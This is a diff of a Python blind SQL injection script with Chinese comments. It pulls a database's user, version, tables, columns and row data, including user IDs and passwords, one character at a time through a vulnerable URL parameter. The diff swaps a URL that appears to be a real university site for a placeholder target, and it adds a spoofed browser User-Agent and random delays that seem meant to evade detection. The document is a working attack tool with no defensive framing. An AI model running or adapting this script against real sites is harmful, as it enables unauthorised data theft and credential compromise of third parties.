@@ -5,9 +5,10 @@ import requests,time,random,sys,threading
 #将所有打印字符的ascii码放在list里面,打印字符从32-127 直接用列表生成式
 list=[i for i in range(32,128)]
 #Target URL
-url = "http://www.bszn.swust.edu.cn/index.php?s=/Guide/index/id/"
+url = "http://xxxx/index.php/home/news/info/nav/danger/class/5/id/"
 #keyword 用于判断页面是否正确
-keyword ="心理测评"
+keyword ="远程签名"
+headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"}
 
 table_list=[]
 column_list=[]
@@ -24,7 +25,7 @@ class Info(object):
             url_tmp = url+payload
             #print(url_tmp)
             try:
-                res = requests.get(url_tmp)
+                res = requests.get(url_tmp,headers=headers)
                 if keyword in res.text:
                     break
                 i+=1
@@ -49,7 +50,7 @@ class Info(object):
                     payload = "-1 OR if(ascii(substr(user(),%s,1))=%s,1,0)"%(j,n)
                     url_tmp = url+payload
                     #print(url_tmp)
-                    res = requests.get(url_tmp)
+                    res = requests.get(url_tmp,headers=headers)
                     if keyword in res.text:
                         if(j==1):
                             sys.stdout.write("[+] 用户名为：")
@@ -76,7 +77,7 @@ class Info(object):
                     payload = "-1 OR if(ascii(substr(version(),%s,1))=%s,1,0)"%(i,n)
                     url_tmp = url+payload
                     #print(url_tmp)
-                    res = requests.get(url_tmp)
+                    res = requests.get(url_tmp,headers=headers)
                     if keyword in res.text:
                         if(i==1):
                             sys.stdout.write("[+] 数据库版本号为：")
@@ -103,7 +104,7 @@ class Info(object):
                     payload = "-1 OR if(ascii(substr(database(),%s,1))=%s,1,0)" % (i, n)
                     url_tmp = url + payload
                     # print(url_tmp)
-                    res = requests.get(url_tmp)
+                    res = requests.get(url_tmp,headers=headers)
                     if keyword in res.text:
                         if (i == 1):
                             sys.stdout.write("[+] 数据库名为：")
@@ -127,7 +128,9 @@ class Table(object):
                 payload = "-1 or (select count(table_name) from " \
                           "information_schema.tables where table_schema=database())="+str(i)
                 url_tmp = url + payload
-                res = requests.get(url_tmp)
+                print(url_tmp)
+                res = requests.get(url_tmp,headers=headers)
+                time.sleep(random.random())
                 if keyword in res.text:
                     break
                 i+=1
@@ -143,7 +146,7 @@ class Table(object):
                 payload = "-1 or (select length(table_name) from information_schema.tables " \
                           "where table_schema=database() limit %s,1)=%s"%(self.i,j)
                 url_tmp = url+payload
-                res = requests.get(url_tmp)
+                res = requests.get(url_tmp,headers=headers)
                 if keyword in res.text:
                     break
                 j+=1
@@ -171,7 +174,7 @@ class Table(object):
                     payload="-1 or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit %s,1),%s,1))=%s"%(self.i,x,n)
                     url_tmp = url+payload
                     print(url_tmp)
-                    res = requests.get(url_tmp)
+                    res = requests.get(url_tmp,headers=headers)
                     if keyword in res.text:
                         value+=chr(n)
                         break
@@ -215,7 +218,7 @@ class Column(object):
                           "information_schema.columns where table_name=%s)=%s"%(self.table,i)
                 url_tmp = url + payload
                 print(url_tmp)
-                res = requests.get(url_tmp)
+                res = requests.get(url_tmp,headers=headers)
                 if keyword in res.text:
                     break
                 i += 1
@@ -229,7 +232,7 @@ class Column(object):
                 payload = "-1 or (select length(column_name) from information_schema.columns " \
                           "where table_name=%s limit %s,1)=%s" % (self.table,self.i, j)
                 url_tmp = url + payload
-                res = requests.get(url_tmp)
+                res = requests.get(url_tmp,headers=headers)
                 if keyword in res.text:
                     break
                 j += 1
@@ -257,7 +260,7 @@ class Column(object):
                     payload = "-1 or ascii(substr((select column_name from information_schema.columns where table_name=%s limit %s,1),%s,1))=%s" % (self.table,self.i, x, n)
                     url_tmp = url + payload
                     print(url_tmp)
-                    res = requests.get(url_tmp)
+                    res = requests.get(url_tmp,headers=headers)
                     if keyword in res.text:
                         value += chr(n)
                         break
@@ -302,7 +305,7 @@ class GetValue(object):
     #-1 or (select count(%s) from %s )=%s
                 payload = "-1 or (select count(%s) from %s )=%s"%(self.column[0],self.table,i)
                 url_tmp = url + payload
-                res = requests.get(url_tmp)
+                res = requests.get(url_tmp,headers=headers)
                 if keyword in res.text:
                     break
                 i += 1
@@ -316,7 +319,7 @@ class GetValue(object):
             try:
                 payload = "-1 or (select length(concat(%s,0x7c,%s)) from %s limit %s,1)=%s"%(self.column[0],self.column[1],self.table,self.i,j)
                 url_tmp = url + payload
-                res = requests.get(url_tmp)
+                res = requests.get(url_tmp,headers=headers)
                 if keyword in res.text:
                     break
                 j += 1
@@ -344,7 +347,7 @@ class GetValue(object):
                     payload = "-1 or ascii(substr((select concat(%s,0x7c,%s) from %s limit %s,1),%s,1))=%s" % (self.column[0],self.column[1],self.table, self.i, x, n)
                     url_tmp = url + payload
                     print(url_tmp)
-                    res = requests.get(url_tmp)
+                    res = requests.get(url_tmp,headers=headers)
                     if keyword in res.text:
                         value += chr(n)
                         break
@@ -383,12 +386,11 @@ def main():
     #注入当前数据库的名字
     #info.database()
     #注入表名
-    #run()
+    run()
     #注入列名
-    run_column("hand_user")
+    #run_column("hand_user")
     #注入数据
     #columnL = ["uid","pwd"]
     #run_value("pw_user",*columnL)
 if __name__ == '__main__':
     main()
-
